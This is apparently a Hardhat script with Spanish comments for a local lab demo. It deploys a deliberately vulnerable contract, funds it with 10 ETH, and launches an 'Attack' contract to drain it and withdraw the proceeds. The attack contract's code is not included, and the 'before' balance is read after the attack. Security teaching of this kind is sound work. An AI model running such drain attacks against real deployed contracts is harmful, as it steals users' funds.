const { ethers } = require("hardhat");

async function main() {
    const [deployer, attacker] = await ethers.getSigners();
    console.log(`âœ… Deployer: ${deployer.address}`);
    console.log(`âœ… Attacker: ${attacker.address}`);

    // ðŸš€ Desplegar el contrato vulnerable
    const VulnerableContract = await ethers.getContractFactory("VulnerableContract");
    const vulnerable = await VulnerableContract.deploy();

    await vulnerable.waitForDeployment();
    console.log(`ðŸ“Œ Contrato vulnerable desplegado en: ${await vulnerable.getAddress()}`);

    // ðŸ’° Depositar ETH en el contrato vulnerable
    let tx = await vulnerable.connect(deployer).deposit({ value: ethers.parseEther("10") });
    await tx.wait();
    console.log(`âœ… Se depositaron 10 ETH en el contrato vulnerable`);

    // ðŸ”¥ Desplegar el contrato atacante
    const Attack = await ethers.getContractFactory("Attack");
    const attackContract = await Attack.connect(attacker).deploy(await vulnerable.getAddress());
    await attackContract.waitForDeployment();
    console.log(`ðŸ“Œ Contrato atacante desplegado en: ${await attackContract.getAddress()}`); // Arreglado error de `attack.getAddress()`

    // ðŸ’° Verificar balance inicial del atacante
    let attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`ðŸ”¹ Balance inicial del atacante: ${ethers.formatEther(attackerBalance)} ETH`);

    // âš”ï¸ Ejecutar el ataque
    console.log("â³ Iniciando ataque...");
    tx = await attackContract.attack({ value: ethers.parseEther("1"), gasLimit: 1000000 });
    await tx.wait();
    console.log("ðŸš€ Ataque completado.");
    

    // ðŸ’° Verificar balance del contrato vulnerable antes y despuÃ©s
    let balanceAntes = await ethers.provider.getBalance(await vulnerable.getAddress());
    console.log("ðŸ’° Balance del contrato vulnerable antes del ataque:", ethers.formatEther(balanceAntes));

    let balanceDespues = await ethers.provider.getBalance(await vulnerable.getAddress());
    console.log("ðŸ’€ Balance del contrato vulnerable despuÃ©s del ataque:", ethers.formatEther(balanceDespues));

    // ðŸ”¥ Verificar balance final del atacante
    attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`ðŸ”¹ Balance final del atacante: ${ethers.formatEther(attackerBalance)} ETH`);

    tx = await attackContract.withdrawFunds();
    await tx.wait();
    console.log("âœ… Fondos retirados del contrato atacante.");

}

//  ðŸ” Ejecutamos la funciÃ³n main
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
